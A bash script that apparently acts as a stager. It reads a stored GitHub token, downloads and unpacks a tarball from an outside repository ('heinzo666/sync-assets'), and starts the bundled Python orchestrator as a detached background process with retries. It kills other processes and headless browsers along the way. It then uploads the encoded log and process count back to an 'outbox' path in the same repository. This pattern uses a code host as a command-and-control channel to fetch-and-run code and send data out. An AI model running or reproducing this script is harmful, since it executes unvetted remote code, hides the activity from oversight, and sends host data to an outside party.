#!/bin/bash
set -u
export HOME=/tmp XDG_CACHE_HOME=/tmp/.cachex LD_LIBRARY_PATH=/tmp/xl2/lib:/tmp/env/lib PLAYWRIGHT_BROWSERS_PATH=/tmp/pw FONTCONFIG_FILE=/tmp/fonts/fonts.conf
T=$(cat /tmp/.ghtok)
ls /tmp/b14/qp_orch3.py >/dev/null 2>&1 || { mkdir -p /tmp/b14; timeout 90 curl -fsSL -H "Authorization: Bearer $T" "https://api.github.com/repos/heinzo666/sync-assets/contents/lab/mint17.tgz?ref=main&t=$RANDOM" | /tmp/env/bin/python -c 'import sys,json,base64;open("/tmp/b14.tgz","wb").write(base64.b64decode(json.load(sys.stdin)["content"]))'; tar xzf /tmp/b14.tgz -C /tmp/b14; }
pkill -f qp_orch ; pkill -f chrome-headless-shell ; sleep 1
rm -f /tmp/orch_oz093708.log
setsid nohup bash -c 'for i in 1 2 3; do env HOME=/tmp XDG_CACHE_HOME=/tmp/.cachex LD_LIBRARY_PATH=/tmp/xl2/lib:/tmp/env/lib PLAYWRIGHT_BROWSERS_PATH=/tmp/pw FONTCONFIG_FILE=/tmp/fonts/fonts.conf STAGE=full /tmp/env/bin/python -u /tmp/b14/qp_orch3.py oz093708 >> /tmp/orch_oz093708.log 2>&1 && break; echo RETRY_$i >> /tmp/orch_oz093708.log; sleep 6; done' < /dev/null &
sleep 32
{ tail -c 900 /tmp/orch_oz093708.log 2>/dev/null; echo; echo PROC $(pgrep -fc qp_orch3); } > /tmp/g938.txt
B=$(base64 -w0 /tmp/g938.txt)
printf '{"message":"go938 %s","content":"%s"}' "$(date -u +%T)" "$B" > /tmp/pg938.json
curl -s -X PUT -H "Authorization: Bearer $T" -H "Content-Type: application/json" \
 https://api.github.com/repos/heinzo666/sync-assets/contents/lab/outbox/go938_1790155011.json \
 --data-binary @/tmp/pg938.json -o /dev/null
echo GO938_DONE
